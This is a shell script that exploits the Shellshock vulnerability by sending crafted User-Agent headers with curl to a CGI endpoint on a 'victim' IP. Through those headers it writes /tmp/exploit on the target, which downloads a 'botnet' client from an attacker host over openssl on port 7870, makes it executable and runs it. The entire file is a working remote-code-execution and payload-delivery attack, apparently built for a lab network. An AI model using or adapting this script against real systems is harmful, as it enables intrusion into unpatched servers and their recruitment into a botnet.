#!/bin/sh

attacker="10.0.2.15"
victim="10.0.2.16"

# Generate a script on the victim at /tmp/exploit.
# The script will download the client thanks to openssl, and execute it.


curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \#/bin/sh > /tmp/exploit'" http://"${victim}":80/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo attacker\=\"${attacker}\" >> /tmp/exploit'" http://"${victim}":80/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo mkdir /tmp/botnet'" http://"${victim}":80/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo printf \'%s\\r\\n\\r\\n\' \'client\' \| openssl s_client -quiet -connect \$\{attacker\}:7870 \> /tmp/botnet/client >> /tmp/exploit'" http://"${victim}":80/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo chmod +x /tmp/botnet/client >> /tmp/exploit'" http://"${victim}":80/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'chmod +x /tmp/exploit'" http://"${victim}":80/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo ready to lauch the exploit. '" http://"${victim}":80/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'exec /tmp/exploit'" http://"${victim}":80/cgi-bin/vulnerable

